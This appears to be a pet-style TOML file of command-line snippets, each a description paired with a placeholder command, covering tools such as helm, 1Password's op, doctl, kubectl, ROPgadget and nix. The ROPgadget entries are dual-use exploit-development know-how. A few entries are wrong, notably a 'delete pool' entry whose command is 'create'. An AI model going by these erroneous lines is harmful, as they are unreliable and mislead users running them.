[[snippets]]
  description = "Perform a dry run"
  command = "helm install <name> <repository_name>/<chart_name> --dry-run"
  output = ""

[[snippets]]
  description = "Install a helm chart with custom values"
  command = "helm install <name> <repository_name>/<chart_name> --set <parameter1>=<value1>,<parameter2>=<value2>"
  output = ""

[[snippets]]
  description = "Install a helm chart passing a custom values file"
  command = "helm install <name> <repository_name>/<chart_name> --values <path/to/values.yaml>"
  output = ""

[[snippets]]
  description = "Copy unstaged files to a specific remote"
  command = "git scp <remote_name>"
  output = ""

[[snippets]]
  description = "Copy staged and unstaged files to a remote"
  command = "git scp <remote_name> HEAD"
  output = ""

[[snippets]]
  description = "Copy files that has been changed in the last commit and any staged or unstaged files to a remote"
  command = "git scp <remote_name> HEAD~1"
  output = ""

[[snippets]]
  description = "Copy specific files to a remote"
  command = "git scp <remote_name> <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Copy a specific directory to a remote"
  command = "git scp <remote_name> <path/to/directory>"
  output = ""

[[snippets]]
  description = "Build documentation"
  command = "sphinx-build -b <html|epub|text|latex|man|...> <path/to/source_dir> <path/to/build_dir>"
  output = ""

[[snippets]]
  description = "Build documentations intended for readthedocs.io (requires the sphinx-rtd-theme pip package)"
  command = "sphinx-build -b <html> <path/to/docs_dir> <path/to/build_dir>"
  output = ""

[[snippets]]
  description = "Colorize edges of one or more graph layouts (that already have layout information) to clarify crossing edges"
  command = "edgepaint <path/to/layout1.gv> <path/to/layout2.gv ...> > <path/to/output.gv>"
  output = ""

[[snippets]]
  description = "Colorize edges using a color scheme. (See <https://graphviz.org/doc/info/colors.html#brewer>)"
  command = "edgepaint -color-scheme=<accent7> <path/to/layout.gv> > <path/to/output.gv>"
  output = ""

[[snippets]]
  description = "Lay out a graph and colorize its edges, then convert to a PNG image"
  command = "dot <path/to/input.gv> | edgepaint | dot -T <png> > <path/to/output.png>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "edgepaint -?"
  output = ""

[[snippets]]
  description = "Convert a PNM image to an SGI image"
  command = "pnmtosgi <path/to/input.pnm> > <path/to/output.sgi>"
  output = ""

[[snippets]]
  description = "Disable or enable compression"
  command = "pnmtosgi -<verbatim|rle> <path/to/input.pnm> > <path/to/output.sgi>"
  output = ""

[[snippets]]
  description = "Write the specified string into the SGI image header's `imagename` field"
  command = "pnmtosgi -imagename <string> <path/to/input.pnm> > <path/to/output.sgi>"
  output = ""

[[snippets]]
  description = "Check if a specific package name is available in the npm registry"
  command = "npm-name <package>"
  output = ""

[[snippets]]
  description = "Find similar package names in the npm registry"
  command = "npm-name --similar <package>"
  output = ""

[[snippets]]
  description = "Run a `doctl databases pool` command with an access token"
  command = "doctl databases pool <command> --access-token <access_token>"
  output = ""

[[snippets]]
  description = "Retrieve information about a database connection pool"
  command = "doctl databases pool get <database_id> <pool_name>"
  output = ""

[[snippets]]
  description = "List connection pools for a database cluster"
  command = "doctl databases pool list <database_id>"
  output = ""

[[snippets]]
  description = "Create a connection pool for a database"
  command = "doctl databases pool create <database_id> <pool_name> --db <new_pool_name> --size <pool_size>"
  output = ""

[[snippets]]
  description = "Delete a connection pool for a database"
  command = "doctl databases pool create <database_id> <pool_name>"
  output = ""

[[snippets]]
  description = "Print messages about the patched files"
  command = "git apply --verbose <path/to/file>"
  output = ""

[[snippets]]
  description = "Apply and add the patched files to the index"
  command = "git apply --index <path/to/file>"
  output = ""

[[snippets]]
  description = "Apply a remote patch file"
  command = "curl -L <https://example.com/file.patch> | git apply"
  output = ""

[[snippets]]
  description = "Output diffstat for the input and apply the patch"
  command = "git apply --stat --apply <path/to/file>"
  output = ""

[[snippets]]
  description = "Apply the patch in reverse"
  command = "git apply --reverse <path/to/file>"
  output = ""

[[snippets]]
  description = "Store the patch result in the index without modifying the working tree"
  command = "git apply --cache <path/to/file>"
  output = ""

[[snippets]]
  description = "Sign in to a 1Password account"
  command = "op signin"
  output = ""

[[snippets]]
  description = "List all vaults"
  command = "op vault list"
  output = ""

[[snippets]]
  description = "Print item details in JSON format"
  command = "op item get <item_name> --format json"
  output = ""

[[snippets]]
  description = "Create a new item with a category in the default vault"
  command = "op item create --category <category_name>"
  output = ""

[[snippets]]
  description = "Print a referenced secret to `stdout`"
  command = "op read <secret_reference>"
  output = ""

[[snippets]]
  description = "Pass secret references from exported environment variables to a command"
  command = "op run -- <command>"
  output = ""

[[snippets]]
  description = "Pass secret references from an environment file to a command"
  command = "op run --env-file <path/to/env_file.env> -- <command>"
  output = ""

[[snippets]]
  description = "Read secret references from a file and save plaintext secrets to a file"
  command = "op inject --in-file <path/to/input_file> --out-file <path/to/output_file>"
  output = ""

[[snippets]]
  description = "Call a command and display its output if it returns a non-zero exit code"
  command = "cronic <command>"
  output = ""

[[snippets]]
  description = "Create a mask of the background in a PAM image"
  command = "pambackground <path/to/image.pam> > <path/to/output.pam>"
  output = ""

[[snippets]]
  description = "Bind a hotkey to a specific command"
  command = "bindkey ""<^k>"" <kill-line>"
  output = ""

[[snippets]]
  description = "Bind a hotkey to a specific key [s]equence"
  command = "bindkey -s '^o' 'cd ..\n'"
  output = ""

[[snippets]]
  description = "[l]ist keymaps"
  command = "bindkey -l"
  output = ""

[[snippets]]
  description = "View the hotkey in a key[M]ap"
  command = "bindkey -M main"
  output = ""

[[snippets]]
  description = "List available templates"
  command = "git ignore-io list"
  output = ""

[[snippets]]
  description = "Generate a .gitignore template"
  command = "git ignore-io <item_a,item_b,item_n>"
  output = ""

[[snippets]]
  description = "Start `wuzz`"
  command = "wuzz"
  output = ""

[[snippets]]
  description = "Send an HTTP request"
  command = "<Ctrl> + R"
  output = ""

[[snippets]]
  description = "Switch to the next view"
  command = "<Ctrl> + J, <Tab>"
  output = ""

[[snippets]]
  description = "Switch to the previous view"
  command = "<Ctrl> + K, <Shift> + <Tab>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "F1"
  output = ""

[[snippets]]
  description = "Install, update, or remove specific plugins"
  command = "grafana-cli plugins <install|update|remove> <plugin_id1 plugin_id2 ...>"
  output = ""

[[snippets]]
  description = "List all installed plugins"
  command = "grafana-cli plugins ls"
  output = ""

[[snippets]]
  description = "Create a new team with the specified description"
  command = "pio team create --description <description> <organization_name>:<team_name>"
  output = ""

[[snippets]]
  description = "Delete a team"
  command = "pio team destroy <organization_name>:<team_name>"
  output = ""

[[snippets]]
  description = "Add a new user to a team"
  command = "pio team add <organization_name>:<team_name> <username>"
  output = ""

[[snippets]]
  description = "Remove a user from a team"
  command = "pio team remove <organization_name>:<team_name> <username>"
  output = ""

[[snippets]]
  description = "List all teams that the user is part of and their members"
  command = "pio team list"
  output = ""

[[snippets]]
  description = "List all teams in an organization"
  command = "pio team list <organization_name>"
  output = ""

[[snippets]]
  description = "Rename a team"
  command = "pio team update --name <new_team_name> <organization_name>:<team_name>"
  output = ""

[[snippets]]
  description = "Change the description of a team"
  command = "pio team update --description <new_description> <organization_name>:<team_name>"
  output = ""

[[snippets]]
  description = "Show the content of all global and local `.gitignore` files"
  command = "git ignore"
  output = ""

[[snippets]]
  description = "Ignore file(s) privately, updating `.git/info/exclude` file"
  command = "git ignore <file_pattern> --private"
  output = ""

[[snippets]]
  description = "Ignore file(s) locally, updating local `.gitignore` file"
  command = "git ignore <file_pattern>"
  output = ""

[[snippets]]
  description = "Ignore file(s) globally, updating global `.gitignore` file"
  command = "git ignore <file_pattern> --global"
  output = ""

[[snippets]]
  description = "Start in interactive mode"
  command = "gpg-card"
  output = ""

[[snippets]]
  description = "Invoke one or more commands non-interactively"
  command = "gpg-card <command1> -- <command2> -- <command3>"
  output = ""

[[snippets]]
  description = "Show information about a smart card"
  command = "gpg-card list"
  output = ""

[[snippets]]
  description = "Retrieve the public key using the URL stored on an OpenPGP card"
  command = "gpg-card fetch"
  output = ""

[[snippets]]
  description = "Set the URL used by the `fetch` command"
  command = "gpg-card url"
  output = ""

[[snippets]]
  description = "Change or unblock PINs (uses the default action for the card in non-interactive mode)"
  command = "gpg-card passwd"
  output = ""

[[snippets]]
  description = "Toggle the forcesig flag of an OpenPGP card (i.e. require entering the user PIN for signing)"
  command = "gpg-card forcesig"
  output = ""

[[snippets]]
  description = "Factory reset a smart card (i.e. delete all data and reset PINs)"
  command = "gpg-card factory-reset"
  output = ""

[[snippets]]
  description = "List gadgets in the binary file"
  command = "ROPgadget --binary <path/to/binary>"
  output = ""

[[snippets]]
  description = "Filter gadgets in the binary file by a regular expression"
  command = "ROPgadget --binary <path/to/binary> --re <regex>"
  output = ""

[[snippets]]
  description = "List gadgets in the binary file, excluding specified type"
  command = "ROPgadget --binary <path/to/binary> --<norop|nojob|nosys>"
  output = ""

[[snippets]]
  description = "Exclude bad byte gadgets in the binary file"
  command = "ROPgadget --binary <path/to/binary> --badbytes <byte_string>"
  output = ""

[[snippets]]
  description = "List gadgets up to the specified number of bytes in the binary file"
  command = "ROPgadget --binary <path/to/binary> --depth <nbyte>"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr rg"
  output = ""

[[snippets]]
  description = "Register a provider"
  command = "az provider register --namespace <Microsoft.PolicyInsights>"
  output = ""

[[snippets]]
  description = "Unregister a provider"
  command = "az provider unregister --namespace <Microsoft.Automation>"
  output = ""

[[snippets]]
  description = "List all providers for a subscription"
  command = "az provider list"
  output = ""

[[snippets]]
  description = "Show information about a specific provider"
  command = "az provider show --namespace <Microsoft.Storage>"
  output = ""

[[snippets]]
  description = "List all resource types for a specific provider"
  command = "az provider list --query ""[?namespace=='<Microsoft.Network>'].resourceTypes[].resourceType"""
  output = ""

[[snippets]]
  description = "Go to a directory that contains "foo" in the name"
  command = "z <foo>"
  output = ""

[[snippets]]
  description = "Go to a directory that contains "foo" and then "bar""
  command = "z <foo> <bar>"
  output = ""

[[snippets]]
  description = "Go to the highest-ranked directory matching "foo""
  command = "z -r <foo>"
  output = ""

[[snippets]]
  description = "Go to the most recently accessed directory matching "foo""
  command = "z -t <foo>"
  output = ""

[[snippets]]
  description = "List all directories in `z`'s database matching "foo""
  command = "z -l <foo>"
  output = ""

[[snippets]]
  description = "Remove the current directory from `z`'s database"
  command = "z -x ."
  output = ""

[[snippets]]
  description = "Restrict matches to subdirectories of the current directory"
  command = "z -c <foo>"
  output = ""

[[snippets]]
  description = "Merge all commits from a specific branch into the current branch as a single commit"
  command = "git squash <source_branch>"
  output = ""

[[snippets]]
  description = "Squash all commits starting with a specific commit on the current branch"
  command = "git squash <commit>"
  output = ""

[[snippets]]
  description = "Squash the `n` latest commits and commit with a message"
  command = "git squash HEAD~<n> ""<message>"""
  output = ""

[[snippets]]
  description = "Squash the `n` latest commits and commit concatenating all individual messages"
  command = "git squash --squash-msg HEAD~<n>"
  output = ""

[[snippets]]
  description = "Display information for the current directory"
  command = "dust"
  output = ""

[[snippets]]
  description = "Display information about one or more directories"
  command = "dust <path/to/directory1 path/to/directory2 ...>"
  output = ""

[[snippets]]
  description = "Display 30 directories (defaults to 21)"
  command = "dust --number-of-lines <30>"
  output = ""

[[snippets]]
  description = "Display information for the current directory, up to 3 levels deep"
  command = "dust --depth <3>"
  output = ""

[[snippets]]
  description = "Display the biggest directories at the top in descending order"
  command = "dust --reverse"
  output = ""

[[snippets]]
  description = "Ignore all files and directories with a specific name"
  command = "dust --ignore-directory <file_or_directory_name>"
  output = ""

[[snippets]]
  description = "Do not display percent bars and percentages"
  command = "dust --no-percent-bars"
  output = ""

[[snippets]]
  description = "Launch the Text-based User Interface"
  command = "pop"
  output = ""

[[snippets]]
  description = "Send an email using the content of a Markdown file as body"
  command = "pop < <path/to/message.md> --from <me@example.com> --to <you@example.com> --subject ""<On the Subject of Ducks...>"" --attach <path/to/attachment>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "pop --help"
  output = ""

[[snippets]]
  description = "Scan a repository"
  command = "astronomer <tldr-pages/tldr-node-client>"
  output = ""

[[snippets]]
  description = "Scan the maximum amount of stars in the repository"
  command = "astronomer <tldr-pages/tldr-node-client> --stars <50>"
  output = ""

[[snippets]]
  description = "Scan a repository including comparative reports"
  command = "astronomer <tldr-pages/tldr-node-client> --verbose"
  output = ""

[[snippets]]
  description = "Run the compiler interactively"
  command = "prqlc compile"
  output = ""

[[snippets]]
  description = "Compile a specific `.prql` file to `stdout`"
  command = "prqlc compile <path/to/file.prql>"
  output = ""

[[snippets]]
  description = "Compile a `.prql` file to a `.sql` file"
  command = "prqlc compile <path/to/source.prql> <path/to/target.sql>"
  output = ""

[[snippets]]
  description = "Compile a query"
  command = "echo ""<from employees | filter has_dog | select salary>"" | prqlc compile"
  output = ""

[[snippets]]
  description = "Watch a directory and compile on file modification"
  command = "prqlc watch <path/to/directory>"
  output = ""

[[snippets]]
  description = "Print the content of the first member in a `.zip` archive"
  command = "funzip <path/to/archive.zip>"
  output = ""

[[snippets]]
  description = "Print the content in a `.gz` archive"
  command = "funzip <path/to/archive.gz>"
  output = ""

[[snippets]]
  description = "Decrypt a `.zip` or `.gz` archive and print the content"
  command = "funzip -password <password> <path/to/archive>"
  output = ""

[[snippets]]
  description = "Create a new issue against the current repository interactively"
  command = "gh issue create"
  output = ""

[[snippets]]
  description = "Create a new issue with the `bug` label interactively"
  command = "gh issue create --label ""<bug>"""
  output = ""

[[snippets]]
  description = "Create a new issue interactively and assign it to the specified users"
  command = "gh issue create --assignee <user1,user2,...>"
  output = ""

[[snippets]]
  description = "Create a new issue with a title, body and assign it to the current user"
  command = "gh issue create --title ""<title>"" --body ""<body>"" --assignee ""<@me>"""
  output = ""

[[snippets]]
  description = "Create a new issue interactively, reading the body text from a file"
  command = "gh issue create --body-file <path/to/file>"
  output = ""

[[snippets]]
  description = "Create a new issue in the default web browser"
  command = "gh issue create --web"
  output = ""

[[snippets]]
  description = "Display the help"
  command = "gh issue create --help"
  output = ""

[[snippets]]
  description = "Update `rustup`"
  command = "rustup self update"
  output = ""

[[snippets]]
  description = "Uninstall `rustup`"
  command = "rustup self uninstall"
  output = ""

[[snippets]]
  description = "Convert a PBM image to an encapsulated PostScript style preview bitmap"
  command = "pbmtoepsi <path/to/image.pbm> > <path/to/output.bmp>"
  output = ""

[[snippets]]
  description = "Produce a quadratic output image with the specified resolution"
  command = "pbmtoepsi -dpi <144> {path/to/image.pbm> > <path/to/output.bmp>"
  output = ""

[[snippets]]
  description = "Produce an output image with the specified horizontal and vertical resolution"
  command = "pbmtoepsi -dpi <72x144> <path/to/image.pbm> > <path/to/output.bmp>"
  output = ""

[[snippets]]
  description = "Only create a boundary box"
  command = "pbmtoepsi -bbonly <path/to/image.pbm> > <path/to/output.bmp>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "aws codecommit help"
  output = ""

[[snippets]]
  description = "Display help for a specific command"
  command = "aws codecommit <command> help"
  output = ""

[[snippets]]
  description = "Launch the default merge tool to resolve conflicts"
  command = "git mergetool"
  output = ""

[[snippets]]
  description = "List valid merge tools"
  command = "git mergetool --tool-help"
  output = ""

[[snippets]]
  description = "Launch the merge tool identified by a name"
  command = "git mergetool --tool <tool_name>"
  output = ""

[[snippets]]
  description = "Don't prompt before each invocation of the merge tool"
  command = "git mergetool --no-prompt"
  output = ""

[[snippets]]
  description = "Explicitly use the GUI merge tool (see the `merge.guitool` configuration variable)"
  command = "git mergetool --gui"
  output = ""

[[snippets]]
  description = "Explicitly use the regular merge tool (see the `merge.tool` configuration variable)"
  command = "git mergetool --no-gui"
  output = ""

[[snippets]]
  description = "Optimize a file using the default plugins (overwrites the original file)"
  command = "svgo <test.svg>"
  output = ""

[[snippets]]
  description = "Optimize a file and save the result to another file"
  command = "svgo <test.svg> -o <test.min.svg>"
  output = ""

[[snippets]]
  description = "Optimize all SVG files within a directory (overwrites the original files)"
  command = "svgo -f <path/to/directory/with/svg/files>"
  output = ""

[[snippets]]
  description = "Optimize all SVG files within a directory and save the resulting files to another directory"
  command = "svgo -f <path/to/input/directory> -o <path/to/output/directory>"
  output = ""

[[snippets]]
  description = "Optimize SVG content passed from another command, and save the result to a file"
  command = "<cat test.svg> | svgo -i - -o <test.min.svg>"
  output = ""

[[snippets]]
  description = "Optimize a file and print out the result"
  command = "svgo <test.svg> -o -"
  output = ""

[[snippets]]
  description = "Show available plugins"
  command = "svgo --show-plugins"
  output = ""

[[snippets]]
  description = "Register your API token"
  command = "spark register <token>"
  output = ""

[[snippets]]
  description = "Display the currently registered API token"
  command = "spark token"
  output = ""

[[snippets]]
  description = "Create a new Spark project"
  command = "spark new <project_name>"
  output = ""

[[snippets]]
  description = "Create a new Spark project with Braintree stubs"
  command = "spark new <project_name> --braintree"
  output = ""

[[snippets]]
  description = "Create a new Spark project with team-based billing stubs"
  command = "spark new <project_name> --team-billing"
  output = ""

[[snippets]]
  description = "Label a pod"
  command = "kubectl label pod <pod_name> <key>=<value>"
  output = ""

[[snippets]]
  description = "Update a pod label by overwriting the existing value"
  command = "kubectl label --overwrite <pod_name> <key>=<value>"
  output = ""

[[snippets]]
  description = "Label all pods in the namespace"
  command = "kubectl label pods --all <key>=<value>"
  output = ""

[[snippets]]
  description = "Label pod identified by pod definition file"
  command = "kubectl label -f <pod_defination_file> <key>=<value>"
  output = ""

[[snippets]]
  description = "Remove the label from a pod"
  command = "kubectl label pod <pod_name> <key>-"
  output = ""

[[snippets]]
  description = "Create a black window with display ID ":2""
  command = "Xephyr -br -ac -noreset -screen <800x600> <:2>"
  output = ""

[[snippets]]
  description = "Start an X application on the new screen"
  command = "DISPLAY=:2 <command_name>"
  output = ""

[[snippets]]
  description = "Scan the current Kubernetes cluster"
  command = "popeye"
  output = ""

[[snippets]]
  description = "Scan a specific namespace"
  command = "popeye -n <namespace>"
  output = ""

[[snippets]]
  description = "Scan specific Kubernetes context"
  command = "popeye --context=<context>"
  output = ""

[[snippets]]
  description = "Use a spinach configuration file for scanning"
  command = "popeye -f <spinach.yaml>"
  output = ""

[[snippets]]
  description = "Make a simple GET request"
  command = "lwp-request -m GET <http://example.com/some/path>"
  output = ""

[[snippets]]
  description = "Upload a file with a POST request"
  command = "lwp-request -m POST <http://example.com/some/path> < <path/to/file>"
  output = ""

[[snippets]]
  description = "Make a request with a custom user agent"
  command = "lwp-request -H 'User-Agent: <user_agent> -m <METHOD> <http://example.com/some/path>"
  output = ""

[[snippets]]
  description = "Make a request with HTTP authentication"
  command = "lwp-request -C <username>:<password> -m <METHOD> <http://example.com/some/path>"
  output = ""

[[snippets]]
  description = "Make a request and print request headers"
  command = "lwp-request -U -m <METHOD> <http://example.com/some/path>"
  output = ""

[[snippets]]
  description = "Make a request and print response headers and status chain"
  command = "lwp-request -E -m <METHOD> <http://example.com/some/path>"
  output = ""

[[snippets]]
  description = "Locate binary, source and man pages for ssh"
  command = "whereis <ssh>"
  output = ""

[[snippets]]
  description = "Locate binary and man pages for ls"
  command = "whereis -bm <ls>"
  output = ""

[[snippets]]
  description = "Locate source of gcc and man pages for Git"
  command = "whereis -s <gcc> -m <git>"
  output = ""

[[snippets]]
  description = "Locate binaries for gcc in `/usr/bin/` only"
  command = "whereis -b -B </usr/bin/> -f <gcc>"
  output = ""

[[snippets]]
  description = "Locate unusual binaries (those that have more or less than one binary on the system)"
  command = "whereis -u *"
  output = ""

[[snippets]]
  description = "Locate binaries that have unusual manual entries (binaries that have more or less than one manual installed)"
  command = "whereis -u -m *"
  output = ""

[[snippets]]
  description = "Start a REPL (interactive shell)"
  command = "sbt"
  output = ""

[[snippets]]
  description = "Create a new Scala project from an existing Giter8 template hosted on GitHub"
  command = "sbt new <scala/hello-world.g8>"
  output = ""

[[snippets]]
  description = "Compile and run all tests"
  command = "sbt test"
  output = ""

[[snippets]]
  description = "Delete all generated files in the `target` directory"
  command = "sbt clean"
  output = ""

[[snippets]]
  description = "Compile the main sources in `src/main/scala` and `src/main/java` directories"
  command = "sbt compile"
  output = ""

[[snippets]]
  description = "Use the specified version of sbt"
  command = "sbt -sbt-version <version>"
  output = ""

[[snippets]]
  description = "Use a specific jar file as the sbt launcher"
  command = "sbt -sbt-jar <path>"
  output = ""

[[snippets]]
  description = "List all sbt options"
  command = "sbt -h"
  output = ""

[[snippets]]
  description = "Print media information about a specific media on the web"
  command = "you-get --info <https://example.com/video?id=value>"
  output = ""

[[snippets]]
  description = "Download a media from a specific URL"
  command = "you-get <https://example.com/video?id=value>"
  output = ""

[[snippets]]
  description = "Search on Google Videos and download"
  command = "you-get <keywords>"
  output = ""

[[snippets]]
  description = "Download a media to a specific location"
  command = "you-get --output-dir <path/to/directory> --output-filename <filename> <https://example.com/watch?v=value>"
  output = ""

[[snippets]]
  description = "Download a media using a proxy"
  command = "you-get --http-proxy <proxy_server> <https://example.com/watch?v=value>"
  output = ""

[[snippets]]
  description = "Start an interactive shell with some packages from `nixpkgs`"
  command = "nix shell <nixpkgs#pkg1 nixpkgs#packageSet.pkg2 ...>"
  output = ""

[[snippets]]
  description = "Start a shell providing a package from an older version of `nixpkgs` (21.05)"
  command = "nix shell <nixpkgs/nixos-21.05#pkg>"
  output = ""

[[snippets]]
  description = "Start a shell with the "default package" from a flake in the current directory, printing build logs if any builds happen"
  command = "nix shell -L"
  output = ""

[[snippets]]
  description = "Start a shell with a package from a flake on GitHub"
  command = "nix shell <github:owner/repo#pkg>"
  output = ""

[[snippets]]
  description = "Run a command in a shell with a package"
  command = "nix shell <nixpkgs#pkg> -c <some-cmd --someflag 'Some other arguments'>"
  output = ""

[[snippets]]
  description = "Start in interactive mode"
  command = "ddgr"
  output = ""

[[snippets]]
  description = "Search DuckDuckGo for a keyword"
  command = "ddgr <keyword>"
  output = ""

[[snippets]]
  description = "Limit the number of search results to `N`"
  command = "ddgr -n <N> <keyword>"
  output = ""

[[snippets]]
  description = "Display the complete URL in search results"
  command = "ddgr -x <keyword>"
  output = ""

[[snippets]]
  description = "Search DuckDuckGo for a keyword and open the first result in the browser"
  command = "ddgr !w <keyword>"
  output = ""

[[snippets]]
  description = "Perform a website-specific search"
  command = "ddgr -w <site> <keyword>"
  output = ""

[[snippets]]
  description = "Search for a specific file type"
  command = "ddgr <keyword> filetype:<filetype>"
  output = ""

[[snippets]]
  description = "Display help in interactive mode"
  command = "?"
  output = ""

[[snippets]]
  description = "Print current time, uptime, number of logged-in users and other information"
  command = "uptime"
  output = ""

[[snippets]]
  description = "Show only the amount of time the system has been booted for"
  command = "uptime --pretty"
  output = ""

[[snippets]]
  description = "Print the date and time the system booted up at"
  command = "uptime --since"
  output = ""

[[snippets]]
  description = "Display version"
  command = "uptime --version"
  output = ""

[[snippets]]
  description = "Initialize a repo with Git annex"
  command = "git annex init"
  output = ""

[[snippets]]
  description = "Add a file"
  command = "git annex add <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Show the current status of a file or directory"
  command = "git annex status <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Synchronize a local repository with a remote"
  command = "git annex <remote>"
  output = ""

[[snippets]]
  description = "Get a file or directory"
  command = "git annex get <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "git annex help"
  output = ""

[[snippets]]
  description = "Start the GUI"
  command = "lmms"
  output = ""

[[snippets]]
  description = "Start the GUI and load external config"
  command = "lmms --config <path/to/config.xml>"
  output = ""

[[snippets]]
  description = "Start the GUI and import MIDI or Hydrogen file"
  command = "lmms --import <path/to/midi/or/hydrogen/file>"
  output = ""

[[snippets]]
  description = "Start the GUI with a specified window size"
  command = "lmms --geometry <x_size>x<y_size>+<x_offset>+<y_offset>"
  output = ""

[[snippets]]
  description = "Dump a `.mmpz` file"
  command = "lmms dump <path/to/mmpz/file.mmpz>"
  output = ""

[[snippets]]
  description = "Render a project file"
  command = "lmms render <path/to/mmpz_or_mmp/file>"
  output = ""

[[snippets]]
  description = "Render the individual tracks of a project file"
  command = "lmms rendertracks <path/to/mmpz_or_mmp/file> <path/to/dump/directory>"
  output = ""

[[snippets]]
  description = "Render with custom samplerate, format, and as a loop"
  command = "lmms render --samplerate <88200> --format <ogg> --loop --output <path/to/output/file.ogg>"
  output = ""

[[snippets]]
  description = "Convert a PPM file to an Atari Spectrum 512 image"
  command = "ppmtospu <path/to/input.ppm> > <path/to/output.spu>"
  output = ""

[[snippets]]
  description = "Use a dithering matrix of the specified size (0 means no dithering)"
  command = "ppmtospu -d<0|2|4> <path/to/input.ppm> > <path/to/output.spu>"
  output = ""

[[snippets]]
  description = "Add a task"
  command = "todoist add ""<task_name>"""
  output = ""

[[snippets]]
  description = "Add a high priority task with a label, project, and due date"
  command = "todoist add ""<task_name>"" --priority <1> --label-ids ""<label_id>"" --project-name ""<project_name>"" --date ""<tmr 9am>"""
  output = ""

[[snippets]]
  description = "Add a high priority task with a label, project, and due date in quick mode"
  command = "todoist quick '#<project_name> ""<tmr 9am>"" p<1> <task_name> @<label_name>'"
  output = ""

[[snippets]]
  description = "List all tasks with a header and color"
  command = "todoist --header --color list"
  output = ""

[[snippets]]
  description = "List all high priority tasks"
  command = "todoist list --filter p<1>"
  output = ""

[[snippets]]
  description = "List today's tasks with high priority that have the specified label"
  command = "todoist list --filter '(@<label_name> | <today>) & p<1>'"
  output = ""

[[snippets]]
  description = "Create a new Python 3.6.6 virtual environment"
  command = "pyenv virtualenv <3.6.6> <virtualenv_name>"
  output = ""

[[snippets]]
  description = "List all existing virtual environments"
  command = "pyenv virtualenvs"
  output = ""

[[snippets]]
  description = "Activate a virtual environment"
  command = "pyenv activate <virtualenv_name>"
  output = ""

[[snippets]]
  description = "Deactivate the virtual environment"
  command = "pyenv deactivate"
  output = ""

[[snippets]]
  description = "Search recursively for a pattern in all files in the current directory"
  command = "rga <regular_expression>"
  output = ""

[[snippets]]
  description = "List available adapters"
  command = "rga --rga-list-adapters"
  output = ""

[[snippets]]
  description = "Change which adapters to use (e.g. ffmpeg, pandoc, poppler etc.)"
  command = "rga --rga-adapters=<adapter1,adapter2> <regular_expression>"
  output = ""

[[snippets]]
  description = "Search for a pattern using the mime type instead of the file extension (slower)"
  command = "rga --rga-accurate <regular_expression>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "rga --help"
  output = ""

[[snippets]]
  description = "Install all gems defined in the `Gemfile` expected in the working directory"
  command = "bundle install"
  output = ""

[[snippets]]
  description = "Execute a command in the context of the current bundle"
  command = "bundle exec <command> <arguments>"
  output = ""

[[snippets]]
  description = "Update all gems by the rules defined in the `Gemfile` and regenerate `Gemfile.lock`"
  command = "bundle update"
  output = ""

[[snippets]]
  description = "Update one or more specific gem(s) defined in the `Gemfile`"
  command = "bundle update <gem_name1> <gem_name2>"
  output = ""

[[snippets]]
  description = "Update one or more specific gems(s) defined in the `Gemfile` but only to the next patch version"
  command = "bundle update --patch <gem_name1> <gem_name2>"
  output = ""

[[snippets]]
  description = "Update all gems within the given group in the `Gemfile`"
  command = "bundle update --group <development>"
  output = ""

[[snippets]]
  description = "List installed gems in the `Gemfile` with newer versions available"
  command = "bundle outdated"
  output = ""

[[snippets]]
  description = "Create a new gem skeleton"
  command = "bundle gem <gem_name>"
  output = ""

[[snippets]]
  description = "Install or upgrade `git-extras` commands"
  command = "git extras update"
  output = ""

[[snippets]]
  description = "Display help"
  command = "git extras --help"
  output = ""

[[snippets]]
  description = "Display version"
  command = "git extras --version"
  output = ""

[[snippets]]
  description = "Commit all staged changes, opening the editor specified by `$EDITOR` to enter the commit message"
  command = "dolt commit"
  output = ""

[[snippets]]
  description = "Commit all staged changes with the specified message"
  command = "dolt commit --message ""<commit_message>"""
  output = ""

[[snippets]]
  description = "Stage all unstaged changes to tables before committing"
  command = "dolt commit --all"
  output = ""

[[snippets]]
  description = "Use the specified ISO 8601 commit date (defaults to current date and time)"
  command = "dolt commit --date ""<2021-12-31T00:00:00>"""
  output = ""

[[snippets]]
  description = "Use the specified author for the commit"
  command = "dolt commit --author ""<author_name> <<author_email>>"""
  output = ""

[[snippets]]
  description = "Allow creating an empty commit, with no changes"
  command = "dolt commit --allow-empty"
  output = ""

[[snippets]]
  description = "Ignore foreign key warnings"
  command = "dolt commit --force"
  output = ""

[[snippets]]
  description = "Identify all duplicates in a given directory and output a summary"
  command = "rdfind -dryrun true <path/to/directory>"
  output = ""

[[snippets]]
  description = "Replace all duplicates with hardlinks"
  command = "rdfind -makehardlinks true <path/to/directory>"
  output = ""

[[snippets]]
  description = "Replace all duplicates with symlinks/soft links"
  command = "rdfind -makesymlinks true <path/to/directory>"
  output = ""

[[snippets]]
  description = "Delete all duplicates and do not ignore empty files"
  command = "rdfind -deleteduplicates true -ignoreempty false <path/to/directory>"
  output = ""

[[snippets]]
  description = "Print the starship integration code for the specified shell"
  command = "starship init <bash|elvish|fish|ion|powershell|tcsh|zsh>"
  output = ""

[[snippets]]
  description = "Append the `starship` integration code to `~/.bashrc`"
  command = "starship init <bash> >> <~/.bashrc>"
  output = ""

[[snippets]]
  description = "Append the `starship` integration code to `~/.zshrc`"
  command = "starship init <zsh> >> <~/.zshrc>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "starship init --help"
  output = ""

[[snippets]]
  description = "Analyze a Docker image"
  command = "dive <your_image_tag>"
  output = ""

[[snippets]]
  description = "Build an image and start analyzing it"
  command = "dive build -t <some_tag>"
  output = ""

[[snippets]]
  description = "Display the current date using the default locale's format"
  command = "date +%c"
  output = ""

[[snippets]]
  description = "Display the current date in UTC, using the ISO 8601 format"
  command = "date -u +%Y-%m-%dT%H:%M:%S%Z"
  output = ""

[[snippets]]
  description = "Display the current date as a Unix timestamp (seconds since the Unix epoch)"
  command = "date +%s"
  output = ""

[[snippets]]
  description = "Convert a date specified as a Unix timestamp to the default format"
  command = "date -d @<1473305798>"
  output = ""

[[snippets]]
  description = "Convert a given date to the Unix timestamp format"
  command = "date -d ""<2018-09-01 00:00>"" +%s --utc"
  output = ""

[[snippets]]
